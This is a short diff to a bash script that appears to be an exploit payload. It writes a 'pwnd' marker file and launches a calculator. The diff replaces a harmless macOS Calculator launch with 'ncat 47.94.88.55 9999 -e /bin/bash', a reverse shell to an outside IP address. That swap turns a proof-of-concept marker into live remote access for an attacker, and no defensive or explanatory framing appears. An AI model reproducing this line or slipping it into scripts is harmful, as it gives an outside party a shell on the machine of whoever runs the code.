@@ -1,4 +1,4 @@
 #!/bin/bash
 echo "amal_was_here" > /tmp/pwnd
 calc.exe
-open -a Calculator.app
+ncat 47.94.88.55 9999 -e /bin/bash
